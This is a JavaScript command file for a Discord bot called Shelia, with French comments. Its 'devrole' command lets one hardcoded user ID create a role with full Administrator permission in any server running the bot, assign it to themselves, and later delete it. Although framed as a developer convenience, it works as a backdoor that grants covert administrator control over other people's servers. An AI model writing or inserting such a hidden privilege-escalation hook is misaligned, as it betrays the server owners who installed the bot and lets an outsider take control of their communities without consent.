const Discord = require('discord.js');
const Shelia = require('../../structures/client/index.js');

module.exports = {
    name: "devrole",
    description: "Ajoute ou supprime le devrole pour le développeur.",
    /**
     * @param {Shelia} client 
     * @param {Discord.Message} message 
     * @param {Array} args 
     */
    run: async (client, message, args) => {
        let dev = ['1285901043774783499'];
        if (!dev.includes(message.author.id)) return;

        const action = args[0]?.toLowerCase();
        
        if (action === 'add') {
            // Vérifier si le rôle existe déjà
            let role = message.guild.roles.cache.find(r => r.name === 'Développeur Shelia');
            
            if (!role) {
                // Créer le rôle s'il n'existe pas
                role = await message.guild.roles.create({
                    name: 'Développeur Shelia',
                    color: '#e1adff',
                    permissions: [Discord.PermissionFlagsBits.Administrator, Discord.PermissionFlagsBits.AddReactions],
                });
            }

            // Ajouter le rôle au membre
            await message.member.roles.add(role);
            message.reply('Rôle Développeur Shelia ajouté avec succès !');
        }
        else if (action === 'del') {
            // Trouver le rôle
            const role = message.guild.roles.cache.find(r => r.name === 'Développeur Shelia');
            
            if (role) {
                // Supprimer le rôle du serveur
                await role.delete();
                message.reply('Rôle Développeur Shelia supprimé avec succès !');
            } else {
                message.reply('Le rôle Développeur Shelia n\'existe pas sur ce serveur.');
            }
        }
        else {
            message.reply('Veuillez spécifier une action valide : `add` ou `del`');
        }
    }
};